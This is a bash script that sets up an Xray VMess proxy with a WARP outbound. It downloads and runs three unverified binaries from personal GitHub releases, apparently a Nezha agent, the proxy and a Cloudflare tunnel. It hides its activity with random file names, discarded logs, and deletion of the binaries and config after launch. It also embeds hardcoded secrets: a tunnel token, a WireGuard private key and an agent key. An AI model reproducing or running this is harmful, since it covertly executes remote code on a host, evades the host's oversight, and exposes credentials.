#!/bin/bash

export NEZHA_KEY=${NEZHA_KEY:-'VoCvCBLVrN5GzKE2B3'}
export ARGO_AUTH=${ARGO_AUTH:-'eyJhIjoiYTUyYzFmMDk1MzAyNTU0YjA3NzJkNjU4ODI0MjRlMzUiLCJ0IjoiMDI5NzU3MjUtYzAyZC00ZTZiLTkwZGMtZmU4NmM1M2UzOThkIiwicyI6Ik16aGhZamhrWkdFdFlUUXhZUzAwTlRZM0xXSTFNV0V0TmpneFpqTXpaREpqTkRWaCJ9'}

generate_xconfig() { 
  cat > config.json << EOF
{
    "log": {
        "access": "/dev/null",
        "error": "/dev/null",
        "loglevel": "none"
    },
    "inbounds": [
        {
            "tag": "vmess-in",
            "port": 8001,
            "listen": "::",
            "protocol": "vmess",
            "settings": {
                "clients": [
                    {
                        "id": "8ff07af2-df4d-4148-a644-ff4c89bddc47"
                    }
                ],
                "decryption": "none"
            },
            "streamSettings": {
                "network": "ws",
                "wsSettings": {
                    "path": "/vmess"
                }
            }
        }
    ],
    "dns": {
        "servers": [
            "https+local://8.8.8.8/dns-query"
        ]
    },
    "outbounds": [
        {
            "tag": "WARP",
            "protocol": "wireguard",
            "settings": {
                "secretKey": "eIhCU8tgY1BzZwc8ZpFMkPmbLSxAu8umF8rxIFw/lFk=",
                "address": [
                    "172.16.0.2/32",
                    "2606:4700:110:854b:dde7:85b3:e480:4049/128"
                ],
                "peers": [
                    {
                        "publicKey": "bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=",
                        "endpoint": "engage.cloudflareclient.com:4500"
                    }
                ],
                "mtu": 1280
            }
        },
        {
            "tag": "direct",
            "protocol": "freedom"
        }
    ],
    "routing": {
        "rules": []
    }
}
EOF
}
generate_xconfig

download_and_run() {
ARCH=$(uname -m) && DOWNLOAD_DIR="." && mkdir -p "$DOWNLOAD_DIR" && FILE_INFO=()
if [ "$ARCH" == "arm" ] || [ "$ARCH" == "arm64" ] || [ "$ARCH" == "aarch64" ]; then
    FILE_INFO=("https://github.com/eooce/test/releases/download/ARM/swith npm" "https://github.com/eooce/test/releases/download/ARM/web web" "https://github.com/eooce/test/releases/download/arm64/bot13 http")
elif [ "$ARCH" == "amd64" ] || [ "$ARCH" == "x86_64" ] || [ "$ARCH" == "x86" ]; then
    FILE_INFO=("https://github.com/jpus/test/releases/download/web/nza-9 npm" "https://github.com/jpus/test/releases/download/web/xhttp-9 web" "https://github.com/jpus/test/releases/download/web/thttp-9 http")
else
    echo "Unsupported architecture: $ARCH"
    exit 1
fi
declare -A FILE_MAP
generate_random_name() {
    local chars=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
    local name=""
    for i in {1..6}; do
        name="$name${chars:RANDOM%${#chars}:1}"
    done
    echo "$name"
}

for entry in "${FILE_INFO[@]}"; do
    URL=$(echo "$entry" | cut -d ' ' -f 1)
    RANDOM_NAME=$(generate_random_name)
    NEW_FILENAME="$DOWNLOAD_DIR/$RANDOM_NAME"
    
    if [ -e "$NEW_FILENAME" ]; then
        echo "$NEW_FILENAME already exists, Skipping download"
    else
        curl -L -sS -o "$NEW_FILENAME" "$URL"
        echo "Downloading $NEW_FILENAME"
    fi
    chmod +x "$NEW_FILENAME"
    FILE_MAP[$(echo "$entry" | cut -d ' ' -f 2)]="$NEW_FILENAME"
done
wait

if [ -e "$(basename ${FILE_MAP[npm]})" ]; then
    export TMPDIR=$(pwd)
    nohup ./"$(basename ${FILE_MAP[npm]})" -p ${NEZHA_KEY} >/dev/null 2>&1 &
    sleep 2
    echo -e "\e[1;32m$(basename ${FILE_MAP[npm]}) is running\e[0m"
fi

if [ -e "$(basename ${FILE_MAP[web]})" ]; then
    nohup ./"$(basename ${FILE_MAP[web]})" -c config.json >/dev/null 2>&1 &
    sleep 2
    echo -e "\e[1;32m$(basename ${FILE_MAP[web]}) is running\e[0m"
fi

if [ -e "$(basename ${FILE_MAP[http]})" ]; then
    nohup ./"$(basename ${FILE_MAP[http]})" tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH} >/dev/null 2>&1 &
    sleep 2
    echo -e "\e[1;32m$(basename ${FILE_MAP[http]}) is running\e[0m" 
fi
for key in "${!FILE_MAP[@]}"; do
    if [ -e "$(basename ${FILE_MAP[$key]})" ]; then
        rm -rf "$(basename ${FILE_MAP[$key]})" >/dev/null 2>&1
    fi
done
}
download_and_run

clear
rm -rf fake_useragent_0.2.0.json config.json >/dev/null 2>&1
exit 0